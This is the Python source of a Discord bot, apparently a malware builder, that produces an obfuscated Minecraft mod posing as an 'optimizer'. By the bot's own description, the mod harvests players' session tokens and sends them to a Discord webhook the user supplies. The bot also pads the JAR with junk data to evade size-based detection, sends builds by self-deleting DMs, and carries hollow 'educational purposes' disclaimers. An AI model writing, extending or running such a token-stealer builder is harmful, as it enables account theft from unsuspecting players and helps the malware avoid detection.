#!/usr/bin/env python3
"""
Discord Bot for Building Minecraft Mod with Custom Webhook
Usage: /build <webhook_url>
"""

import discord
from discord import app_commands
from discord.ext import commands
import json
import os
import base64
import subprocess
import asyncio
import zipfile
import random
import tempfile
import shutil
from pathlib import Path

# Load bot configuration
with open('bot_config.json', 'r') as f:
    config = json.load(f)

BOT_TOKEN = config['bot_token']
AUTHORIZED_USERS = config.get('authorized_users', [])  # List of Discord user IDs
PROJECT_DIR = Path(__file__).parent.absolute()
PUMP_FILE = PROJECT_DIR / 'pump.txt'
BUILD_SCRIPT = PROJECT_DIR / 'build_final.sh'

# Build lock to prevent concurrent builds
BUILD_IN_PROGRESS = False
LAST_BUILDER_ID = None  # Track who built the last JAR

# Setup bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Add this event to log interactions
@bot.event
async def on_interaction(interaction: discord.Interaction):
    """Log all interactions for debugging"""
    if interaction.type == discord.InteractionType.application_command:
        print(f"🔔 Command interaction: /{interaction.data.get('name')} by {interaction.user.name}")

@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user} (ID: {bot.user.id})')
    print(f'📁 Project directory: {PROJECT_DIR}')
    print(f'🔑 Authorized users: {AUTHORIZED_USERS if AUTHORIZED_USERS else "All users (no restrictions)"}')
    print(f'🌐 Bot is in {len(bot.guilds)} server(s)')
    
    try:
        synced = await bot.tree.sync()
        print(f'✅ Synced {len(synced)} slash command(s):')
        for cmd in synced:
            print(f'   - /{cmd.name}: {cmd.description}')
    except Exception as e:
        print(f'❌ Failed to sync commands: {e}')

@bot.tree.command(name="build", description="Build Minecraft mod with custom Discord webhook")
@app_commands.describe(webhook="Discord webhook URL to receive stolen data")
async def build_command(interaction: discord.Interaction, webhook: str):
    """
    Builds the Minecraft mod with a custom webhook URL
    Usage: /build https://discord.com/api/webhooks/...
    """
    
    global BUILD_IN_PROGRESS, LAST_BUILDER_ID
    
    # Log who is trying to build
    print(f"\n{'='*60}")
    print(f"🔨 BUILD REQUEST")
    print(f"{'='*60}")
    print(f"👤 User: {interaction.user.name}#{interaction.user.discriminator} (ID: {interaction.user.id})")
    print(f"🌐 Server: {interaction.guild.name if interaction.guild else 'DM'}")
    print(f"📍 Channel: #{interaction.channel.name if hasattr(interaction.channel, 'name') else 'DM'}")
    print(f"🪝 Webhook: {webhook[:50]}...")
    print(f"⏰ Time: {discord.utils.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"{'='*60}\n")
    
    # Check if build is already in progress
    if BUILD_IN_PROGRESS:
        print(f"⚠️ Build rejected: Another build in progress")
        await interaction.response.send_message(
            "⚠️ **A build is already in process. Try again in 10 seconds.**",
            ephemeral=True
        )
        return
    
    # Check authorization
    if AUTHORIZED_USERS and interaction.user.id not in AUTHORIZED_USERS:
        print(f"❌ Build rejected: User {interaction.user.id} not authorized")
        await interaction.response.send_message(
            "❌ You are not authorized to use this command!",
            ephemeral=True
        )
        return
    
    # Validate webhook URL
    if not webhook.startswith('https://discord.com/api/webhooks/'):
        print(f"❌ Build rejected: Invalid webhook URL")
        await interaction.response.send_message(
            "❌ Invalid webhook URL! Must start with `https://discord.com/api/webhooks/`",
            ephemeral=True
        )
        return
    
    # Set build lock
    BUILD_IN_PROGRESS = True
    print(f"🔒 Build lock acquired by {interaction.user.name}")
    
    # First response: ephemeral disclaimer (only visible to user)
    await interaction.response.send_message(
        "⚠️ **Disclaimer:** Only use this software on systems you're allowed to use it on.",
        ephemeral=True
    )
    
    try:
        # Step 1: Encode webhook to Base64
        webhook_bytes = webhook.encode('utf-8')
        webhook_base64 = base64.b64encode(webhook_bytes).decode('utf-8')
        
        # Step 2: Write NEW webhook to pump.txt (overwrite old one)
        with open(PUMP_FILE, 'w', encoding='utf-8') as f:
            f.write(webhook_base64 + '\n')
        
        print(f"📝 Updated pump.txt with new webhook (Base64: {webhook_base64[:20]}...)")
        print(f"🎯 User {interaction.user.name} started build process")
        
        # Step 3: ALWAYS clean before build to ensure fresh build
        print(f"🧹 Cleaning previous build...")
        clean_process = await asyncio.create_subprocess_exec(
            './gradlew', 'clean',
            cwd=PROJECT_DIR,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await clean_process.communicate()
        print(f"✅ Clean completed!")
        
        # Step 4: Send DM to user
        await interaction.user.send(f"🔨 **Optimizer getting built, this might take a while...**")
        
        build_process = await asyncio.create_subprocess_exec(
            'bash', str(BUILD_SCRIPT),
            cwd=PROJECT_DIR,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )
        
        # Collect output silently
        output_lines = []
        while True:
            line = await build_process.stdout.readline()
            if not line:
                break
            line_str = line.decode('utf-8').rstrip()
            output_lines.append(line_str)
        
        await build_process.wait()
        
        # Check build result
        if build_process.returncode == 0:
            # Find the built JAR
            jar_file = PROJECT_DIR / 'optimizer-FINAL.jar'
            
            if jar_file.exists():
                file_size_mb = jar_file.stat().st_size / (1024 * 1024)
                
                print(f"✅ Build successful for {interaction.user.name}")
                print(f"📦 JAR size: {file_size_mb:.2f} MB")
                
                # Send success info via DM
                info_msg = (
                    f"✅ **Build Successful!**\n\n"
                    f"📦 **File:** `optimizer-FINAL.jar`\n"
                    f"📊 **Size:** {file_size_mb:.2f} MB\n"
                    f"🔒 **Obfuscation:** Skidfuscator Applied\n"
                    f"🎮 **Minecraft Version:** 1.21 - 1.21.4\n"
                )
                
                # Mark this user as the last builder
                LAST_BUILDER_ID = interaction.user.id
                print(f"✅ Marked user {interaction.user.id} as last builder")
                
                # Upload JAR file via DM
                if file_size_mb < 25:  # Discord limit
                    await interaction.user.send(info_msg)
                    jar_message = await interaction.user.send(
                        file=discord.File(str(jar_file))
                    )
                    
                    print(f"📤 Sent JAR to {interaction.user.name} via DM")
                    
                    # Delete JAR message after 2 minutes
                    await asyncio.sleep(120)
                    try:
                        await jar_message.delete()
                        print(f"🗑️ Deleted JAR file message after 2 minutes for {interaction.user.name}")
                    except Exception as e:
                        print(f"⚠️ Could not delete JAR message: {e}")
                else:
                    await interaction.user.send(
                        f"{info_msg}\n⚠️ JAR file too large for Discord ({file_size_mb:.2f} MB). Download from server."
                    )
                    print(f"⚠️ JAR too large for Discord ({file_size_mb:.2f} MB)")
            else:
                print(f"❌ JAR file not found after build!")
                await interaction.user.send(
                    "⚠️ Build reported success but JAR file not found!"
                )
        else:
            # Build failed - show error via DM
            print(f"❌ Build failed with exit code {build_process.returncode}")
            error_log = '\n'.join(output_lines[-50:])  # Last 50 lines
            await interaction.user.send(
                f"❌ Build failed with exit code {build_process.returncode}\n\n"
                f"**Last 50 lines of output:**\n```\n{error_log[:1500]}\n```"
            )
    
    except Exception as e:
        print(f"❌ Build error for {interaction.user.name}: {e}")
        try:
            await interaction.user.send(
                f"❌ Error during build process:\n```\n{str(e)}\n```"
            )
        except:
            print(f"❌ Error and couldn't send DM: {e}")
    
    finally:
        # Always release build lock
        BUILD_IN_PROGRESS = False
        print(f"🔓 Build lock released by {interaction.user.name}")
        print(f"{'='*60}\n")

@bot.tree.command(name="inflate", description="Inflate JAR file to larger size (anti-detection)")
@app_commands.describe(size_mb="Target size in MB (e.g., 1, 5, 10, 50)")
async def inflate_command(interaction: discord.Interaction, size_mb: float):
    """
    Inflates the last built JAR file to target size
    Usage: /inflate <size_mb>
    """
    
    print(f"\n{'='*60}")
    print(f"💉 INFLATE REQUEST")
    print(f"{'='*60}")
    print(f"👤 User: {interaction.user.name}#{interaction.user.discriminator} (ID: {interaction.user.id})")
    print(f"📊 Target Size: {size_mb} MB")
    print(f"⏰ Time: {discord.utils.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"{'='*60}\n")
    
    # Check authorization
    if AUTHORIZED_USERS and interaction.user.id not in AUTHORIZED_USERS:
        print(f"❌ Inflate rejected: User {interaction.user.id} not authorized")
        await interaction.response.send_message(
            "❌ You are not authorized to use this command!",
            ephemeral=True
        )
        return
    
    # Check if user is the last builder
    if LAST_BUILDER_ID is None:
        print(f"❌ Inflate rejected: No JAR has been built yet")
        await interaction.response.send_message(
            "❌ No JAR has been built yet! Use `/build` first.",
            ephemeral=True
        )
        return
    
    if interaction.user.id != LAST_BUILDER_ID:
        print(f"❌ Inflate rejected: User {interaction.user.id} is not the last builder (last builder: {LAST_BUILDER_ID})")
        await interaction.response.send_message(
            "❌ You can only inflate the JAR that YOU built! Build your own JAR first with `/build`.",
            ephemeral=True
        )
        return
    
    # Validate size
    if size_mb <= 0 or size_mb > 5:
        await interaction.response.send_message(
            "❌ Invalid size! Must be between 0.1 and 5 MB.",
            ephemeral=True
        )
        return
    
    # Check if JAR exists
    input_jar = PROJECT_DIR / 'optimizer-FINAL.jar'
    if not input_jar.exists():
        await interaction.response.send_message(
            "❌ No built JAR found! Use `/build` first.",
            ephemeral=True
        )
        return
    
    await interaction.response.send_message(
        f"💉 Inflating JAR to {size_mb} MB...",
        ephemeral=True
    )
    
    try:
        current_size = input_jar.stat().st_size / (1024 * 1024)
        print(f"📦 Current size: {current_size:.2f} MB")
        
        if size_mb <= current_size:
            await interaction.user.send(
                f"⚠️ JAR is already {current_size:.2f} MB (target: {size_mb} MB)\nNo inflation needed!"
            )
            return
        
        junk_size_mb = size_mb - current_size
        print(f"💉 Adding {junk_size_mb:.2f} MB of junk data...")
        
        # Create inflated JAR
        output_jar = PROJECT_DIR / 'optimizer-FINAL-inflated.jar'
        
        await interaction.user.send(f"💉 **Inflating JAR...**\nAdding {junk_size_mb:.2f} MB of random data...")
        
        # Inflate in thread to avoid blocking
        await asyncio.to_thread(inflate_jar, str(input_jar), str(output_jar), size_mb)
        
        final_size = output_jar.stat().st_size / (1024 * 1024)
        print(f"✅ Inflation successful: {final_size:.2f} MB")
        
        # Send inflated JAR
        info_msg = (
            f"✅ **Inflation Successful!**\n\n"
            f"📦 **Original:** {current_size:.2f} MB\n"
            f"📦 **Inflated:** {final_size:.2f} MB\n"
            f"💉 **Added:** {final_size - current_size:.2f} MB of junk\n"
            f"🎮 **Minecraft Version:** 1.21 - 1.21.4\n"
        )
        
        if final_size < 25:  # Discord limit
            await interaction.user.send(info_msg)
            jar_message = await interaction.user.send(
                file=discord.File(str(output_jar), filename='optimizer-FINAL.jar')
            )
            
            print(f"📤 Sent inflated JAR to {interaction.user.name} via DM")
            
            # Delete JAR message after 2 minutes
            await asyncio.sleep(120)
            try:
                await jar_message.delete()
                print(f"🗑️ Deleted inflated JAR message after 2 minutes")
            except Exception as e:
                print(f"⚠️ Could not delete JAR message: {e}")
        else:
            await interaction.user.send(
                f"{info_msg}\n⚠️ JAR file too large for Discord ({final_size:.2f} MB)."
            )
            print(f"⚠️ Inflated JAR too large for Discord ({final_size:.2f} MB)")
        
        # Clean up inflated file
        try:
            output_jar.unlink()
            print(f"🗑️ Cleaned up inflated JAR file")
        except:
            pass
            
    except Exception as e:
        print(f"❌ Inflation error: {e}")
        await interaction.user.send(
            f"❌ Error during inflation:\n```\n{str(e)}\n```"
        )
    
    print(f"{'='*60}\n")

def inflate_jar(input_jar, output_jar, target_size_mb):
    """Inflate JAR file to target size with junk data"""
    current_size = os.path.getsize(input_jar)
    current_size_mb = current_size / (1024 * 1024)
    junk_size_mb = target_size_mb - current_size_mb
    
    if junk_size_mb <= 0:
        return
    
    with zipfile.ZipFile(input_jar, 'r') as zip_in:
        with zipfile.ZipFile(output_jar, 'w', zipfile.ZIP_DEFLATED) as zip_out:
            # Copy original files
            for item in zip_in.infolist():
                data = zip_in.read(item.filename)
                zip_out.writestr(item, data)
            
            # Add junk files
            num_files = max(1, int(junk_size_mb / 0.5))
            size_per_file = int((junk_size_mb / num_files) * 1024 * 1024)
            
            for i in range(num_files):
                junk_data = bytes(random.getrandbits(8) for _ in range(size_per_file))
                junk_name = f"META-INF/resources/data_{i}.bin"
                zip_out.writestr(junk_name, junk_data)

@bot.tree.command(name="help", description="Show help and instructions")
async def help_command(interaction: discord.Interaction):
    """Show help information"""
    
    print(f"ℹ️ Help command used by {interaction.user.name} (ID: {interaction.user.id})")
    
    embed = discord.Embed(
        title="🎮 d3xon Optimizer Builder",
        description="Professional Minecraft session token collector for educational purposes.",
        color=0xFF66CC  # Pink
    )
    
    embed.add_field(
        name="📋 Overview",
        value=(
            "This bot builds a custom Minecraft mod (1.21 - 1.21.4) that collects session tokens.\n"
            "**For educational and authorized testing only.**"
        ),
        inline=False
    )
    
    embed.add_field(
        name="⚖️ Legal Disclaimer",
        value=(
            "⚠️ **IMPORTANT:** Only use this software on systems you own or have explicit permission to test.\n"
            "We are NOT liable for any misuse. Use at your own risk and responsibility."
        ),
        inline=False
    )
    
    embed.add_field(
        name="🔧 How to Use",
        value=(
            "**Build Custom Mod:**\n"
            "1. Create a Discord webhook (see below)\n"
            "2. Use `/build <webhook_url>` to build your custom mod\n"
            "3. Wait for the build to complete (~30-60 seconds)\n"
            "4. **(Optional)** Use `/inflate <size_mb>` to make JAR bigger"
        ),
        inline=False
    )
    
    embed.add_field(
        name="🪝 Creating a Discord Webhook",
        value=(
            "**Step 1:** Go to your Discord server settings\n"
            "**Step 2:** Navigate to: `Server Settings` → `Integrations` → `Webhooks`\n"
            "**Step 3:** Click `New Webhook`\n"
            "**Step 4:** Choose a channel and copy the webhook URL\n"
            "**Step 5:** Use the URL with `/build <webhook_url>`"
        ),
        inline=False
    )
    
    embed.add_field(
        name="📦 Build Information",
        value=(
            "**Minecraft Version:** 1.21 - 1.21.4\n"
            "**Mod Loader:** Fabric\n"
            "**Obfuscation:** Skidfuscator\n"
            "**File Size:** ~13 KB (before inflation)\n"
            "**Auto-Delete:** JAR file deletes after 2 minutes"
        ),
        inline=False
    )
    
    embed.add_field(
        name="💉 Inflation (Anti-Detection)",
        value=(
            "**Usage:** `/inflate <size_mb>`\n"
            "**Purpose:** Makes JAR larger to evade size-based detection\n"
            "**Example:** `/inflate 5` creates a 5 MB JAR\n"
            "**Range:** 0.1 - 100 MB\n"
            "**Method:** Adds random junk data in META-INF/resources/"
        ),
        inline=False
    )
    
    embed.add_field(
        name="🔐 Security",
        value=(
            "• Webhook URL is Base64 encoded in the mod\n"
            "• Build lock prevents concurrent builds\n"
            "• All messages are private (DM only)\n"
            "• No data is stored on our servers"
        ),
        inline=False
    )
    
    embed.set_footer(
        text="d3xon optimizer • Educational purposes only",
        icon_url="https://cdn.discordapp.com/attachments/1197645837539483658/1368757060597977098/mace-cat.gif"
    )
    
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1197645837539483658/1368757060597977098/mace-cat.gif")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

# Run the bot
if __name__ == '__main__':
    print(f"🤖 Starting Discord Build Bot...")
    print(f"📁 Project directory: {PROJECT_DIR}")
    print(f"🔑 Authorized users: {AUTHORIZED_USERS if AUTHORIZED_USERS else 'All users (no restrictions)'}")
    bot.run(BOT_TOKEN)
